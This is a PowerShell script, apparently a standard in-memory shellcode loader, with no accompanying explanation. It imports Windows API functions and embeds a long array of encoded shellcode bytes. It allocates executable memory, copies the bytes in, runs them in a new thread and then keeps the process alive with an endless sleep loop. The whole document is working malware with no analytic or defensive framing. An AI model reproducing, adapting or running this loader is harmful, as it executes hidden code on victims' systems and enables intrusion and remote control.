
$twue = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $twue -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x6e,0x6f,0x30,0x01,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x13,0x03,0x56,0x13,0x83,0xee,0x92,0x8d,0xc5,0xfd,0x82,0xd0,0x26,0xfe,0x52,0xb5,0xaf,0x1b,0x63,0xf5,0xd4,0x68,0xd3,0xc5,0x9f,0x3d,0xdf,0xae,0xf2,0xd5,0x54,0xc2,0xda,0xda,0xdd,0x69,0x3d,0xd4,0xde,0xc2,0x7d,0x77,0x5c,0x19,0x52,0x57,0x5d,0xd2,0xa7,0x96,0x9a,0x0f,0x45,0xca,0x73,0x5b,0xf8,0xfb,0xf0,0x11,0xc1,0x70,0x4a,0xb7,0x41,0x64,0x1a,0xb6,0x60,0x3b,0x11,0xe1,0xa2,0xbd,0xf6,0x99,0xea,0xa5,0x1b,0xa7,0xa5,0x5e,0xef,0x53,0x34,0xb7,0x3e,0x9b,0x9b,0xf6,0x8f,0x6e,0xe5,0x3f,0x37,0x91,0x90,0x49,0x44,0x2c,0xa3,0x8d,0x37,0xea,0x26,0x16,0x9f,0x79,0x90,0xf2,0x1e,0xad,0x47,0x70,0x2c,0x1a,0x03,0xde,0x30,0x9d,0xc0,0x54,0x4c,0x16,0xe7,0xba,0xc5,0x6c,0xcc,0x1e,0x8e,0x37,0x6d,0x06,0x6a,0x99,0x92,0x58,0xd5,0x46,0x37,0x12,0xfb,0x93,0x4a,0x79,0x93,0x50,0x67,0x82,0x63,0xff,0xf0,0xf1,0x51,0xa0,0xaa,0x9d,0xd9,0x29,0x75,0x59,0x1e,0x00,0xc1,0xf5,0xe1,0xab,0x32,0xdf,0x25,0xff,0x62,0x77,0x8c,0x80,0xe8,0x87,0x31,0x55,0x84,0x82,0xa5,0x96,0xf1,0x8d,0x14,0x7f,0x00,0x8e,0x57,0xc4,0x8d,0x68,0x07,0x6a,0xde,0x24,0xe7,0xda,0x9e,0x94,0x8f,0x30,0x11,0xca,0xaf,0x3a,0xfb,0x63,0x45,0xd5,0x52,0xdb,0xf1,0x4c,0xff,0x97,0x60,0x90,0xd5,0xdd,0xa2,0x1a,0xda,0x22,0x6c,0xeb,0x97,0x30,0x18,0x1b,0xe2,0x6b,0x8e,0x24,0xd8,0x06,0x2e,0xb1,0xe7,0x80,0x79,0x2d,0xea,0xf5,0x4d,0xf2,0x15,0xd0,0xc6,0x3b,0x80,0x9b,0xb0,0x43,0x44,0x1c,0x40,0x12,0x0e,0x1c,0x28,0xc2,0x6a,0x4f,0x4d,0x0d,0xa7,0xe3,0xde,0x98,0x48,0x52,0xb3,0x0b,0x21,0x58,0xea,0x7c,0xee,0xa3,0xd9,0x7c,0xd2,0x75,0x27,0x0b,0x3a,0x46;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$WOc7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($WOc7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$WOc7,0,0,0);for (;;){Start-sleep 60};

